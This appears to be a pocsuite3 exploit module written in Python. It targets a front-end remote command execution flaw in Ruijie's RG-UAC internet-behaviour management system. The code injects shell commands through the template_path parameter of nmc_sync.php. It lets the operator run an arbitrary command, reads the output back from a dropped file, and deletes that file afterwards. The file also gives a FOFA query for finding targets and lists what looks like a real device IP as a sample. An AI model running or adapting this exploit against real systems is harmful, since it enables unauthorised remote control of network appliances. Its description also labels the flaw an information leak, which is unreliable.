from collections import OrderedDict
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY
from pocsuite3.api import OptString
from collections import OrderedDict

class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    name = '锐捷_统一上网行为管理系统_前台RCE'
    appName = '锐捷'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''
        锐捷统一上网行为管理与审计系统_信息泄露 
        可查看用户名及密码
        FOFA搜索 title="rg-uac"
        '''
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ['https://112.18.226.64:8443']

    def _verify(self):
        result = {}
        target = self.url + "/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|id%20%3EEf3a.txt|cat"
        try:
            r1 = requests.get(target,allow_redirects=True,verify=False)
            print(r1.text)
            if "OK" in r1.text and r1.status_code == 200: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                #clean
                delete = self.url+'/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=/view/systemConfig/management/Ef3a.txt'
                requests.delete(delete,timeout=2.5)
        except Exception as e:
            logger.error(e)
        return self.parse_output(result)

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString('', description='请输入需要执行的命令', require=True)
        return o

    def _attack(self):
        result = {}
        command = self.get_option("cmd")
        target = self.url + "/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=|"+command+"%20%3EEf3a.txt|cat"
        try:
            r = requests.get(target,allow_redirects=True,verify=False)
            if "OK" in r.text and r.status_code == 200: 
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                cat = self.url+'/view/systemConfig/management/Ef3a.txt' #手动回显
                r1 = requests.get(cat,allow_redirects=True,verify=False)
                logger.info(r1.text)
                #clean
                delete = self.url+'/view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=/view/systemConfig/management/Ef3a.txt'
                r2 = requests.delete(delete,timeout=2.5)
                if r2.status_code != 200:
                    logger.info("文件清理失败")
        except Exception as e:
            logger.error(e)
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(DemoPOC)